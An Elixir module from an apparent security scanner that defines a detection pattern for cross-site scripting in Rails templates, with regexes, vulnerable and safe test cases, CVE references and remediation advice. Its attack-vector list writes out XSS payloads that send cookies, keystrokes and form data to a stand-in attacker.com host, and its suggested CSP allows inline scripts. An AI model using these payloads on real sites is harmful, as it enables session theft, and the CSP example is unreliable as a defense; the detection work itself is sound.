defmodule RsolvApi.Security.Patterns.Rails.TemplateXss do
  @moduledoc """
  Rails Template XSS pattern for Rails applications.
  
  This pattern detects Cross-Site Scripting (XSS) vulnerabilities in Rails 
  templates through unsafe output methods like raw(), html_safe(), and 
  unescaped ERB tags. XSS is one of the most common web application 
  vulnerabilities and can lead to account takeover, data theft, and malware distribution.
  
  ## Background
  
  Rails provides automatic HTML escaping by default in templates, but developers
  can bypass this protection using methods like raw(), html_safe(), or unescaped
  ERB tags (<%== %>). When user input is passed to these methods without proper
  sanitization, it creates XSS vulnerabilities.
  
  ## Vulnerability Details
  
  The vulnerability occurs when:
  1. User input is passed to raw() or html_safe() methods
  2. Unescaped ERB output tags (<%== %>) are used with user data
  3. Link helpers (link_to) use raw() or html_safe() on user input
  4. Content helpers (content_tag) bypass escaping with user data
  5. Haml templates use unescaped output (!= ) with user input
  
  ## Known CVEs
  
  - CVE-2015-3226: XSS in ActiveSupport JSON encoding (CVSS 6.1)
  - CVE-2013-4389: XSS in simple_format helper in ActionPack
  - CVE-2014-7829: XSS in Action View when certain data is passed to truncate
  - Multiple XSS vulnerabilities in Rails applications using raw/html_safe
  
  ## Examples
  
      # Critical - raw() with user input
      <%= raw params[:content] %>
      
      # Critical - html_safe with user input  
      <%= params[:description].html_safe %>
      
      # Critical - unescaped ERB output
      <%== params[:content] %>
      
      # Critical - link_to with raw user input
      <%= link_to raw(params[:text]), user_path %>
      
      # Safe - default Rails escaping
      <%= params[:content] %>
      
      # Safe - sanitized content
      <%= sanitize(params[:content]) %>
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  
  @impl true
  def pattern do
    %RsolvApi.Security.Pattern{
      id: "rails-template-xss",
      name: "Rails Template XSS",
      description: "Cross-site scripting through unsafe template output methods",
      type: :xss,
      severity: :medium,
      languages: ["ruby"],
      frameworks: ["rails"],
      regex: [
        # raw() helper with user input patterns (exclude comments)
        ~r/^(?!.*#.*<%=\s*raw).*<%=\s*raw\s+[\\w@]*params\[/,
        ~r/^(?!.*#.*<%=\s*raw).*<%=\s*raw\s+[\\w@]*user_\w+/,
        ~r/^(?!.*#.*<%=\s*raw).*<%=\s*raw\s+[\\w@]*request\./,
        ~r/^(?!.*#.*<%=\s*raw).*<%=\s*raw\s+@\w+\.\w+/,
        ~r/^(?!.*#.*raw).*raw\s*\(\s*params\[/,
        ~r/^(?!.*#.*raw).*raw\s*\(\s*user_\w+/,
        ~r/^(?!.*#.*raw).*raw\s*\(\s*@\w+\.\w+/,
        ~r/^(?!.*#.*raw).*raw\s*\(\s*request\./,
        # html_safe method with user input
        ~r/<%=\s*params\[.*?\]\.html_safe/,
        ~r/<%=\s*user_\w+\.html_safe/,
        ~r/<%=\s*@\w+\.\w+\.html_safe/,
        ~r/<%=\s*request\..*?\.html_safe/,
        ~r/params\[.*?\]\.html_safe/,
        ~r/user_\w+\.html_safe/,
        ~r/@\w+\.\w+\.html_safe/,
        ~r/request\..*?\.html_safe/,
        # Unescaped ERB output (<%== %>)
        ~r/<%==\s*params\[/,
        ~r/<%==\s*user_\w+/,
        ~r/<%==\s*@\w+\.\w+/,
        ~r/<%==\s*request\./,
        # content_tag with raw
        ~r/content_tag.*?raw\s*\(/,
        ~r/content_tag\s*\(\s*:\w+\s*,\s*raw\s*\(/,
        ~r/content_tag\s+:\w+\s*,\s*raw\s+/,
        # link_to with raw or html_safe
        ~r/link_to\s+raw\s*\(/,
        ~r/link_to\s+.*?\.html_safe/,
        ~r/link_to\s+params\[.*?\]\.html_safe/,
        ~r/link_to\s+user_\w+\.html_safe/,
        # Haml unescaped output
        ~r/!=\s*params\[/,
        ~r/!=\s*user_\w+/,
        ~r/!=\s*@\w+\.\w+/,
        ~r/!=\s*request\./,
        # Unsafe link_to href (OWASP Rails cheat sheet finding)
        ~r/link_to\s+[\"'].*?[\"']\s*,\s*@\w+\.\w+$/,
        ~r/link_to\s+[\"'].*?[\"']\s*,\s*params\[/,
        ~r/link_to\s+[\"'].*?[\"']\s*,\s*user_\w+$/,
        ~r/link_to\s+[\"'].*?[\"']\s*,\s*request\./,
        # Complex patterns
        ~r/render\s+html:\s*.*?\.html_safe/,
        ~r/button_to\s+raw\s*\(/,
        ~r/form_tag\s+url_for\s*\(.*?\.html_safe/,
        ~r/concat\s+raw\s*\(/
      ],
      default_tier: :public,
      cwe_id: "CWE-79",
      owasp_category: "A03:2021",
      recommendation: "Use Rails built-in escaping or sanitization helpers: sanitize(), strip_tags(), or h(). Remove raw() and html_safe() calls on user content.",
      test_cases: %{
        vulnerable: [
          "<%= raw params[:content] %>",
          "<%= params[:text].html_safe %>",
          "<%== user_input %>",
          "link_to raw(params[:text]), user_path"
        ],
        safe: [
          "<%= sanitize(params[:content]) %>",
          "<%= params[:content] %>",
          "<%= h(user_input) %>",
          "link_to sanitize(params[:text]), user_path"
        ]
      }
    }
  end
  
  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Cross-Site Scripting (XSS) in Rails templates is a critical web security 
      vulnerability that occurs when user-controlled data is output to HTML pages 
      without proper escaping or sanitization. While Rails provides automatic HTML 
      escaping by default, developers can bypass this protection using methods like 
      raw(), html_safe(), or unescaped ERB output tags, creating XSS vulnerabilities 
      when user input reaches these methods.
      
      The vulnerability is particularly dangerous because:
      1. It can execute arbitrary JavaScript in users' browsers
      2. It can steal session cookies and authentication tokens
      3. It can perform actions on behalf of the victim user
      4. It can redirect users to malicious websites
      5. It's often overlooked due to Rails' default escaping giving a false sense of security
      """,
      
      attack_vectors: """
      1. **Script Injection**: <script>alert('XSS')</script>
      2. **Cookie Theft**: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
      3. **Session Hijacking**: <script>fetch('http://attacker.com/steal', {method:'POST', body:document.cookie})</script>
      4. **Keylogger**: <script>document.onkeypress=function(e){fetch('http://attacker.com/keys?k='+e.key)}</script>
      5. **Form Hijacking**: <script>document.forms[0].action='http://attacker.com/steal'</script>
      6. **Phishing**: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">Fake login form</div>
      7. **Iframe Injection**: <iframe src="http://malicious-site.com" width="100%" height="100%"></iframe>
      8. **Event Handler Injection**: <img src=x onerror="alert('XSS')">
      9. **CSS Injection**: <style>body{background:url('http://attacker.com/steal.php?data='+document.cookie)}</style>
      10. **BeEF Hook**: <script src="http://attacker.com:3000/hook.js"></script>
      """,
      
      business_impact: """
      - Account takeover through session/cookie theft
      - Financial fraud through unauthorized transactions
      - Data breach and data theft exposing customer information
      - Reputation damage from security incidents
      - Regulatory fines for data protection violations (GDPR, CCPA)
      - Legal liability from compromised user accounts
      - Loss of customer trust and business
      - Malware distribution to users
      - Defacement of website content
      - Compliance violations (PCI DSS, SOX, HIPAA)
      """,
      
      technical_impact: """
      - Complete compromise of user sessions
      - Theft of authentication cookies and tokens
      - Unauthorized actions performed as the victim user
      - Access to user's sensitive data and functionality
      - Ability to modify page content and behavior
      - Keystroke capture and form data theft
      - Browser exploitation and malware installation
      - Network reconnaissance from user's browser
      - Social engineering and phishing attacks
      - Persistent XSS creating ongoing compromise
      """,
      
      likelihood: "High - XSS is very common due to frequent use of user input in templates and bypassing of Rails' default protections",
      
      cve_examples: [
        "CVE-2015-3226 - XSS in ActiveSupport JSON encoding affecting Rails 3.x, 4.1.x, 4.2.x (CVSS 6.1)",
        "CVE-2013-4389 - Format string vulnerabilities in Action Mailer log subscriber (related to output handling)",
        "CVE-2014-7829 - XSS in Action View when certain data passed to truncate helper",
        "CVE-2012-3463 - XSS in select_tag helper in Action View",
        "CVE-2011-2929 - XSS in strip_tags helper",
        "CVE-2009-4214 - XSS in escape_once helper",
        "HackerOne Report #755354 - XSS in link_to helper when passing parameters directly"
      ],
      
      compliance_standards: [
        "OWASP Top 10 2021 - A03: Injection",
        "CWE-79: Cross-site Scripting (XSS)",
        "CWE-116: Improper Encoding or Escaping of Output",
        "PCI DSS 6.5.7 - Cross-site scripting (XSS)",
        "NIST SP 800-53 - SI-10 Information Input Validation",
        "ISO 27001 - A.14.2.5 Secure system engineering principles",
        "ASVS 4.0 - V5.3 Output Encoding and Injection Prevention",
        "SANS Top 25 - CWE-79 Cross-site Scripting"
      ],
      
      remediation_steps: """
      1. **Remove Unsafe Methods (Critical)**:
         ```ruby
         # NEVER do this - Critical XSS vulnerability
         <%= raw params[:content] %>              # DANGEROUS
         <%= params[:text].html_safe %>          # DANGEROUS
         <%== user_input %>                      # DANGEROUS
         
         # Always use Rails' default escaping
         <%= params[:content] %>                 # SAFE - Auto-escaped
         ```
      
      2. **Use Sanitization Helpers**:
         ```ruby
         # For user content that may contain HTML
         <%= sanitize(params[:content]) %>       # Whitelist safe tags
         <%= sanitize(params[:content], tags: %w[p br strong em]) %>
         
         # For plain text content
         <%= strip_tags(params[:content]) %>     # Remove all HTML
         <%= h(params[:content]) %>              # Explicit HTML escaping
         ```
      
      3. **Secure Link Generation**:
         ```ruby
         # Bad - Direct user input in href
         <%= link_to "Visit", @user.website %>   # VULNERABLE to href injection
         
         # Good - Validate URLs first
         def safe_url(url)
           uri = URI.parse(url)
           return nil unless %w[http https].include?(uri.scheme)
           return nil unless uri.host.present?
           url
         rescue URI::InvalidURIError
           nil
         end
         
         <%= link_to "Visit", safe_url(@user.website) if safe_url(@user.website) %>
         ```
      
      4. **Content Security Policy (Defense in Depth)**:
         ```ruby
         # In ApplicationController
         before_action :set_content_security_policy
         
         private
         
         def set_content_security_policy
           response.headers['Content-Security-Policy'] = 
             "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
         end
         ```
      
      5. **Input Validation at Model Level**:
         ```ruby
         class User < ApplicationRecord
           validates :bio, length: { maximum: 1000 }
           validates :website, format: { 
             with: URI::regexp(%w[http https]), 
             message: "must be a valid URL" 
           }
           
           def safe_bio
             ActionController::Base.helpers.sanitize(bio)
           end
         end
         ```
      """,
      
      prevention_tips: """
      - Never use raw(), html_safe(), or <%== %> with user input
      - Always rely on Rails' default HTML escape mechanisms for user content
      - Use sanitize() helper for content that legitimately needs some HTML
      - Use strip_tags() to remove all HTML from user input
      - Validate and whitelist URLs before using in link_to
      - Implement Content Security Policy (CSP) headers
      - Use Rails' form helpers instead of building forms manually
      - Regularly audit templates for raw() and html_safe() usage
      - Train developers on XSS risks and secure templating
      - Use security linters like Brakeman in CI/CD pipelines
      - Perform regular penetration testing focusing on XSS
      - Implement automated security scanning in development
      """,
      
      detection_methods: """
      - Static analysis with Brakeman scanner (detects most XSS patterns)
      - Manual code review focusing on raw(), html_safe(), <%== %> usage
      - Grep/ripgrep patterns: raw\\\\s*\\\\(.*params, \\\\.html_safe, <%==
      - Dynamic testing with XSS payloads: <script>alert('XSS')</script>
      - Web application security scanners (OWASP ZAP, Burp Suite)
      - Browser developer tools to inspect rendered HTML
      - XSS testing tools like XSSHunter, XSStrike
      - Penetration testing with manual XSS payload injection
      - Runtime application security (RASP) solutions
      - Security-focused linters and IDE plugins
      """,
      
      safe_alternatives: """
      # 1. Use Rails' default HTML escaping (Recommended)
      <%= params[:content] %>  # Automatically escaped and safe
      
      # 2. Explicit sanitization for rich content
      class ApplicationHelper
        def safe_user_content(content)
          sanitize(content, tags: %w[p br strong em ul ol li blockquote],
                   attributes: %w[href])
        end
      end
      
      # In view
      <%= safe_user_content(@post.content) %>
      
      # 3. Strip all HTML for plain text
      <%= strip_tags(params[:content]) %>
      
      # 4. Explicit HTML escaping
      <%= h(params[:content]) %>  # Same as default, but explicit
      
      # 5. Safe URL handling
      class UrlValidator
        ALLOWED_SCHEMES = %w[http https].freeze
        
        def self.safe_url?(url)
          return false if url.blank?
          uri = URI.parse(url)
          ALLOWED_SCHEMES.include?(uri.scheme) && uri.host.present?
        rescue URI::InvalidURIError
          false
        end
      end
      
      # In view
      <% if UrlValidator.safe_url?(@user.website) %>
        <%= link_to "Website", @user.website, target: "_blank", rel: "noopener" %>
      <% end %>
      
      # 6. Content helper with automatic escaping
      <%= content_tag :div, params[:content], class: "user-content" %>
      
      # 7. Safe form helpers (automatically escaped)
      <%= form_with model: @user do |f| %>
        <%= f.text_field :name %>  # Input automatically escaped
        <%= f.text_area :bio %>    # Output automatically escaped
      <% end %>
      
      # 8. Custom sanitizer with strict whitelist
      class StrictSanitizer
        include ActionView::Helpers::SanitizeHelper
        
        ALLOWED_TAGS = %w[p br strong em].freeze
        ALLOWED_ATTRIBUTES = %w[].freeze
        
        def self.clean(content)
          ActionController::Base.helpers.sanitize(
            content, 
            tags: ALLOWED_TAGS,
            attributes: ALLOWED_ATTRIBUTES
          )
        end
      end
      
      # Usage
      <%= StrictSanitizer.clean(params[:content]) %>
      """
    }
  end
  
  @impl true
  def ast_enhancement do
    %{
      min_confidence: 0.7,
      
      context_rules: %{
        # Dangerous output methods that bypass escaping
        dangerous_methods: [
          "raw", "html_safe", "content_tag", "link_to", "button_to",
          "concat", "render", "form_tag"
        ],
        
        # Common sources of user input
        user_input_sources: [
          "params", "request", "cookies", "session",
          "query_params", "form_params", "user_input", "@user", "@post"
        ],
        
        # Template patterns that are dangerous
        dangerous_erb_patterns: [
          "<%==", "raw(", ".html_safe", "!=", "link_to"
        ],
        
        # Safe patterns to reduce false positives
        safe_patterns: [
          ~r/sanitize\s*\(/,                # Using sanitize helper
          ~r/strip_tags\s*\(/,             # Using strip_tags
          ~r/h\s*\(/,                      # Using h() helper
          ~r/escape_once\s*\(/,            # Using escape_once
          ~r/raw\s*\(\s*[\"'][^\"']*[\"']\s*\)/,  # Static strings only
          ~r/\.html_safe\s*$/              # html_safe on string literals
        ]
      },
      
      confidence_rules: %{
        adjustments: %{
          # Very high confidence for raw/html_safe with user input
          raw_or_html_safe_usage: +0.4,
          # High confidence for unescaped ERB output
          unescaped_erb_output: +0.3,
          # Medium confidence for link_to with variables
          link_to_with_variables: +0.2,
          # High confidence for content_tag with raw
          content_tag_with_raw: +0.3,
          # Lower if sanitization detected
          uses_sanitization: -0.5,
          # Much lower in test files
          in_test_file: -0.8,
          # Lower if static content detected
          static_content_pattern: -0.6,
          # Higher for Haml unescaped output
          haml_unescaped_output: +0.3
        }
      },
      
      ast_rules: %{
        # Template output analysis
        output_analysis: %{
          check_erb_tags: true,
          detect_unescaped_output: true,
          track_method_calls: true,
          dangerous_methods: ["raw", "html_safe"]
        },
        
        # Method call context analysis
        method_analysis: %{
          check_receiver: true,
          check_arguments: true,
          trace_user_input: true,
          dangerous_method_patterns: ["raw", "html_safe", "content_tag", "link_to"]
        },
        
        # Variable flow tracking
        variable_flow: %{
          track_assignments: true,
          check_method_chains: true,
          detect_user_input_flow: true
        },
        
        # Safety pattern detection
        safety_detection: %{
          sanitization_methods: ["sanitize", "strip_tags", "h", "escape_once"],
          safe_method_patterns: ~r/sanitize|strip_tags|html_escape/,
          validation_patterns: ~r/validate|whitelist|safe_url/
        }
      }
    }
  end
  
  @impl true
  def applies_to_file?(file_path, frameworks \\ nil) do
    # Apply to Ruby and ERB files in Rails projects
    is_template_file = String.ends_with?(file_path, ".rb") || 
                      String.ends_with?(file_path, ".erb") ||
                      String.ends_with?(file_path, ".haml") ||
                      String.ends_with?(file_path, ".slim")
    
    # Rails framework check
    frameworks_list = frameworks || []
    is_rails = "rails" in frameworks_list
    
    # Apply to template files in Rails projects
    # XSS can occur in views, helpers, and controllers
    is_rails_file = String.contains?(file_path, "app/views/") ||
                    String.contains?(file_path, "app/helpers/") ||
                    String.contains?(file_path, "app/controllers/") ||
                    String.contains?(file_path, "lib/")
    
    # If no frameworks specified but it looks like Rails, include it
    inferred_rails = frameworks_list == [] && is_rails_file
    
    is_template_file && (is_rails || inferred_rails)
  end
end